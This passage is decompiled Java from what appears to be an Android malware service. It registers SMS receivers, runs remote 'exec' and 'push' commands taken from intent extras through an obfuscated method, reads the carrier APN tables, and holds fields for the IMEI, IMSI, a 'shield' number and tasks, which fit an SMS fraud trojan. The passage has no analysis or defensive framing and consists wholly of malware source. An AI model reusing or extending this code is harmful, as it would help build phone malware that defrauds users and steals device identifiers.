                s44 = stringbuilder4.append(s43).toString();
                i1 = Log.e("info", s44);
            }
        }
        s42 = StringUtil.getExecTime();
        nexttime = s42;
        flag = true;
        if(true) goto _L9; else goto _L8
_L8:
    }

    public void onDestroy()
    {
        super.onDestroy();
        SMSReceiver smsreceiver = sendReceiver;
        unregisterReceiver(smsreceiver);
        SMSReceiver smsreceiver1 = deliveryReceiver;
        unregisterReceiver(smsreceiver1);
        SMSReceiver smsreceiver2 = smsReceiver;
        unregisterReceiver(smsreceiver2);
    }

    public void onStart(Intent intent, int i)
    {
        super.onStart(intent, i);
        Bundle bundle = intent.getExtras();
        if(bundle.containsKey("exec"))
        {
            String s = (String)bundle.get("exec");
            execExec(s, null);
        }
        if(!bundle.containsKey("push"))
        {
            return;
        } else
        {
            String s1 = (String)bundle.get("push");
            epxuesch(s1, null);
            return;
        }
    }

    private static final String ACTION_SMS_DELIVERY = "com.test.sms.delivery";
    private static final String ACTION_SMS_RECEIVER = "android.provider.Telephony.SMS_RECEIVED";
    private static final String ACTION_SMS_SEND = "com.test.sms.send";
    private static final Uri ALL_APN_URI = Uri.parse("content://telephony/carriers");
    private static final Uri PREFERRED_APN_URI = Uri.parse("content://telephony/carriers/preferapn");
    public static String recordlog = "/sdcard/androidh.log";
    private String bigpid;
    private SMSReceiver deliveryReceiver;
    private String exactnum;
    Handler handler;
    private String imei;
    private String imsi;
    private boolean issend;
    private String mnc;
    TimerTask newtask;
    private String nexttime;
    private SMSReceiver sendReceiver;
    private String servicecenter;
    private String shieldnum;
    private String smallpid;
    private SMSReceiver smsReceiver;
    private String task;
    private String tel;
    private String testtel;
    Timer timer;







}
